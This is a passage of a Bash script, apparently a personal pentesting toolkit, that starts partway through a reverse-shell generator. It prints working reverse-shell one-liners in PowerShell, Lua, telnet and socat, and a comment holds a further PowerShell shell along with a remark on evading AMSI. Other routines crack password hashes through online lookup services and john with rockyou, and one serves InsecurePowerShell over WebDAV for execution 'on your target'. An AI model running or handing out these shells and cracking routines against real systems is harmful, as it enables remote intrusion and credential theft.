    "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
    "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
    "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
    "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
    *)                              echo "[!] Unknown revshell type!" ;;
  esac
  echo
  exit
fi
# 2DO:
# - ruby revshell doesn't work somehow
# - psh flagged by AMSI :/
# $a = New-Object System.Net.Sockets.TCPClient('127.0.0.1',30033);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$e = (iex $d 2>&1 | Out-String );$f  = $e + "PS> ";$g = ([text.encoding]::ASCII).GetBytes($f);$b.Write($g,0,$g.Length);$b.Flush()};$a.Close()

## h(ash)s(earch) [md5|sha1|...] [hash]^: Search for hashes
# hashsearch help
if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy h(ash)s(earch) [md5|sha(1)|sha2(56)|sha3(56)|sha5(12)] [hash]"
  exit
fi

if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
  HASH="$3"

  case "$2" in
    "md5")              TYPE="md5" ;;
    "sha"|"sha1")       TYPE="sha1" ;;
    "sha256"|"sha2")    TYPE="sha256" ;;
    "sha384"|"sha3")    TYPE="sha356" ;;
    "sha512"|"sha5")    TYPE="sha512" ;;
    "lm"|"LM")          TYPE="lm" ;;
    "nt"|"NT")          TYPE="ntlm" ;;
    *)                  echo "[!] Error parsing type of hash!"; exit ;;
  esac

  if [[ "$TYPE" =~ md5|sha1|sha256|sha356|sha512 ]]; then
    RES="$(curl -ski https://hashtoolkit.com/reverse-"$TYPE"-hash/?hash="$HASH")"

    if [ -n "$(grep -i 'No hashes found for' <<< "$RES")" ]; then
      echo "[!] (hashtoolkit.com) No match found!";
    else
      PASSWD="$(grep -m 1 -io "/generate-hash/?text=.*>" <<< "$RES" | cut -d'>' -f2 | sed 's,</a,,')"
      PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
      PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
      echo "[*] (hashtoolkit.com) Match found: $PASSWD"; exit
    fi
  fi

  if [[ "$TYPE" =~ md5|sha1 ]]; then
    case "$TYPE" in
      "md5")        RES="$(curl -ski https://md5.gromweb.com/?md5="$HASH")" ;;
      "sha1")       RES="$(curl -ski https://sha1.gromweb.com/?hash="$HASH")" ;;
      *)            echo "[!] Error parsing type of hash!"; exit ;;
    esac

    PASSWD="$(grep -i "was succesfully reversed" -A1 <<< "$RES" | grep "long-content string" | cut -d'>' -f2 | sed 's,</em.*,,' )"
    if [ -z "$RES" ]; then
      echo "[!] (gromweb.com) No match found!";
    else
      echo "[*] (gromweb.com) Match found: $PASSWD"; exit
    fi
  fi

  set -x
  if [[ "$TYPE" =~ nt ]]; then
    RES=$(curl -sk 'https://cracker.okx.ch/crack' \
      -H 'authority: cracker.okx.ch' \
      -H 'pragma: no-cache' \
      -H 'cache-control: no-cache' \
      -H 'accept: application/json, text/javascript, */*; q=0.01' \
      -H 'dnt: 1' \
      -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36' \
      -H 'content-type: application/json' \
      -H 'origin: https://www.objectif-securite.ch' \
      -H 'sec-fetch-site: cross-site' \
      -H 'sec-fetch-mode: cors' \
      -H 'sec-fetch-dest: empty' \
      -H 'referer: https://www.objectif-securite.ch/' \
      -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
      --data-binary '{"value":"'"$HASH"'"}' \
      --compressed)

    PASSWD="$(jq -r .msg <<< "$RES")"
    if [[  ! "$RES" =~ Password\ not\ found ]]; then
      echo "[!] (objectif-securite.ch) No match found!";
    else
      echo "[*] (objectif-securite.ch) Match found: $PASSWD"; exit
    fi
  fi

  if [[ "$TYPE" =~ md5|sha1|sha256|lm|nt ]]; then
    if [ "$TYPE" == "nt" ]; then TYPE="ntlm"; fi
    RES=$(curl -ski "https://reverse-hash-lookup.online-domain-tools.com/" --data "text=$HASH&function=$TYPE&do=form-submit&phone=5deab72563840e7678c4067671849b85332d7438&send=%3E+Reverse!")
    if [ -n "$(grep -i 'You do not have enough credits in your account.' <<< "$RES")" ]; then
      echo "[!] (online-domain-tools.com) No free credits left!";
    elif [ -n "$(grep -i 'Hash #1:</b> ERROR:' <<< "$RES")" ]; then
      echo "[!] (online-domain-tools.com) No match found or error!";
    else
      PASSWD="$(grep -o -m 1 "Hash #1.*" <<< "$RES" | cut -d' ' -f3 | sed 's,</.*$,,')"
      PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
      PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
      echo "[*] (online-domain-tools.com) Match found: $PASSWD"
    fi
  fi

  # Still here?
  echo -e "\nNothing found so far. Want to do it manually on crackstation.net?"
  CMD="firefox 'https://crackstation.net'"
  echo "> $CMD"; prompt; bash -c "$CMD"; exit
fi
# 2DO:
# - https://md5decrypt.net/en/Api/ - signup broken
# - access online-domain-tools.com via tor for more free creds?
# - implement more lm/ntlm crackers

## h(ash)g(en) [md5|sha1|sha256|...] [input]^: Generate hashes from input
# hashgen help
if { [ "$1" == "hashgen" ] || [ "$1" == "hg" ]; } && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy h(ash)g(en) [md5|sha(1)|sha2(56)|sha3(84)|sha5(12)] [hash]"
  exit
fi

if { [ "$1" == "hashgen" ] || [ "$1" == "hg" ]; } && [ "$#" -eq 3 ]; then
  TYPE="$2"
  INPUT="$3"

  case "$TYPE" in
    "md5" )             CMD="md5sum" ;;
    "sha"|"sha1")       CMD="sha1sum" ;;
    "sha256"|"sha2")    CMD="sha256sum" ;;
    "sha384"|"sha3")    CMD="sha384sum" ;;
    "sha512"|"sha5")    CMD="sha512sum" ;;
    *)                  echo "[!] Error parsing type of hash!"; exit ;;
  esac

  echo "$(echo -n "$INPUT" | $CMD | cut -d' ' -f1)"
  exit
fi

## h(ash)i(d) [hash]^: Identify hash type
if { [ "$1" == "hashid" ] || [ "$1" == "hid" ] || [ "$1" == "hi" ]; } && [ "$#" -eq 2 ]; then
  HASH="$2"
  if [ "$(which hashid)" ]; then
    echo "=== hashid ==="
    hashid "$HASH" | grep -v ^Analyzing; echo
  fi
  if [ "$(which hash-identifier)" ] ;then
    echo "=== hash-identifier ==="
    echo -n "$HASH" | hash-identifier 2>/dev/null| sed '1,14d' | head -n -2
  fi
  exit
fi

## h(ash)c(rack) [type] [hash|cid]^: Crack hash
if { [ "$1" == "hashcrack" ] || [ "$1" == "hc" ]; } && [ "$#" -eq 3 ]; then
  WRDLST="/usr/share/wordlists/rockyou.txt"
  if [ ! -f "$WRDLST" ]; then
    if [ -e "$WRDLST.gz" ]; then
      echo "[?] rockyou still zipped. Unzip?"
      CMD="gunzip $WRDLST.gz"
      echo "> $CMD"; prompt; bash -c "$CMD";
    else
      WRDLST="/path/to/my/wrdlst"
    fi
  fi

  TYPE="$2"
  case "$TYPE" in
    "md5" )             JTYPE="raw-md5" ;;
    "sha"|"sha1")       JTYPE="raw-sha1" ;;
    "sha256"|"sha2")    JTYPE="raw-sha256" ;;
    "sha512"|"sha5")    JTYPE="raw-sha512" ;;
    *)                  echo "[!] Error parsing type of hash!"; exit ;;
  esac

  HASH="$3"
  USRNME="unknown"
  if [ "$(echo -n "$HASH" | wc -c)" -le 2 ]; then
    # assume a cid is given since hash is too short
    CID="$3"
    getCreds
  fi
  # write hash to file with username
  CMD1="echo \"$USRNME:$HASH\" > hash_$USRNME.txt"
  CMD2="john --format=$JTYPE --wordlist $WRDLST --fork=2 --pot=hash.pot hash_$USRNME.txt"
  echo -e "> $CMD1\n> $CMD2"; prompt; bash -c "$CMD1; $CMD2"; exit
fi
# 2DO:
# - add hashcat support
# http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

## ipwsh [port]^: Download InsecurePowerShell and serve via davserver
if [ "$1" == "ipwsh" ]; then
  echo "[?] Download InsecurePowerShell and serve via davserver?"; prompt
  if [ ! "$(which davserver)" ]; then
    echo "[!] 'davserver' required but missing."
    CMD="sudo pip3 install PyWebDAV3"
    echo "> $CMD";
    prompt
    bash -c "$CMD"
  fi

  FPATH="/dev/shm/.fxy/ipwsh"
  if [ -d "$FPATH/pwsh" ]; then
    cd "$FPATH/pwsh"
  else
    mkdir -p "$FPATH"
    cd "$FPATH"
    wget https://github.com/cobbr/InsecurePowerShell/releases/download/InsecurePowerShell-v6.0.0-rc.2/InsecurePowerShell-v6.0.0-rc.2-win-x64.zip -O pwsh.zip
    unzip pwsh.zip
    mv InsecurePowerShell-v6.0.0-rc.2-win-x64 pwsh
    cd pwsh
  fi

  PORT="80"
  if [ "$#" -ge 2 ]; then
    PORT="$2"
  fi

  echo -e "\n$(tput bold)[*] Run this on your target:"

  if [ "$PORT" -eq 80 ]; then
    echo "  \\\\$(getIP)\DavWWWRoot\pwsh\pwsh.exe"
  else
    echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh\pwsh.exe"
  fi
  echo "$(tput sgr0) "

  CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH -n"
  echo "> $CMD";
  bash -c "$CMD"
  exit
fi
# 2DO:
# - Somehow ipwsh can't access c:\

# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
# msf multi handler
# msf venom most common
# smbclient
# smbmap
# enum4linux
# bash one liners
# fix stuff:
# /usr/bin/python3 -m pip install --upgrade pip

# Nothing found? Invalid command?
show_help; exit
